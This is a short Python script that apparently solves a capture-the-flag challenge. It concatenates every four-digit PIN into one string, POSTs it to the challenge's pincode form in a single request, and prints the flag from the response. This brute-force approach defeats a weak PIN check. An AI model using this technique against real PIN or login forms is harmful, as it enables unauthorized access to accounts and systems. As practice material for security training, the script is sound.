import requests
body = ""
for i in range(10):
    for e in range(10):
        for j in range(10):
            for f in range(10):
                body += str(i)+str(e)+str(j)+str(f)
r = requests.post("http://pincode.challs.olicyber.it/", data={"pincode":body})
print(r.text[r.text.find("flag"):r.text.find("flag")+30].strip(), end="")